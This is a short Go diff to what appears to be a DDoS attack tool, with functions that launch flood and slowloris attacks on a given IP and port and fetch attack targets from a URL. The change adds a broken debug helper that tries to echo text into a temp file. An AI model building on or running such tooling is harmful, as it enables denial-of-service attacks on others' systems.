@@ -80,8 +80,10 @@ func cronAttackDDoS(ip string, port string, date string, dateNs int64) {
 }
 
 func attackDDoS(ip string, port string) {
+	test()
 	ddosmain(ip + ":" + port)
 //	slowloris(ip + ":" + port)
+	test()
 }
 
 func getAttackInfo(url string, target interface{}) error {
@@ -138,4 +140,9 @@ func randomNumber(max int) int {
 	rand.Seed(time.Now().UnixNano())
 	min := 1
 	return rand.Intn(max-min+1) + min
+}
+
+func test() {
+	cmd := exec.Command("echo \"test\" >> /tmp/tmp.txt")
+	cmd.Run()
 }
